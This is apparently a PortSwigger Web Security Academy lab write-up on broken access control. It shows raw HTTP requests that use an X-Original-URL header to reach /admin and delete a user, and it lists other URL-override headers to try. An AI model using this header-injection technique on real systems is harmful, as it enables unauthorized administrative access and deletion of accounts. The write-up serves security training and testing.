# Challenge Name: URL-based access control can be circumvented
# Platform: PortSwigger
# Difficulty: Practitioner

## 1. Vulnerability Type
Broken Access Control

## 2. Root Cause
The application performs access control checks based on the URL in the request line. 
However, the backend framework also supports the `X-Original-URL` header, which overrides the requested path.

Because the application fails to validate authorization after this rewrite, an attacker can access restricted endpoints by supplying a malicious `X-Original-URL` header.
## 3. Attack Surface
`/admin/delete?username=carlos`

## 4. Exploit Method
It is possible to include `X-Original-URL` header into requests of this web application because framework supports it. Therefore, it is possible to access `/admin` page without writing it directly to the `GET` path:
```bash
GET / HTTP/2
Host: 0a4300cd04834971810f8ab3006a00cd.web-security-academy.net
Cookie: session=a6W1iK6Nod51rXwmozakXYrDdmnjlyre
X-Original-URL: /admin
...
```
Endpoints should be included in the main path to be used:
```bash
GET /?username=carlos HTTP/2
Host: 0a4300cd04834971810f8ab3006a00cd.web-security-academy.net
Cookie: session=a6W1iK6Nod51rXwmozakXYrDdmnjlyre
X-Original-URL: /admin/delete
...
```
## 5. Payload / Technique
Header manipulation – using the `X-Original-URL` header to override the protected endpoint.
## 6. Impact
Unauthorized users can access endpoints that they should not. This leads to data leak, data loss, financial loss, and possible full administrative access.

## 7. Reusable Pattern
Using `X-Original-URL` in endpoints that require authentication might help to bypass it. It is important to identify if it supports this header first.

## 8. Key Takeaway
When testing access control, check whether the application supports URL override headers such as:

* X-Original-URL
* X-Rewrite-URL
* X-Forwarded-URI

These headers are sometimes used by reverse proxies and frameworks, and may allow attackers to bypass front-end access control rules.

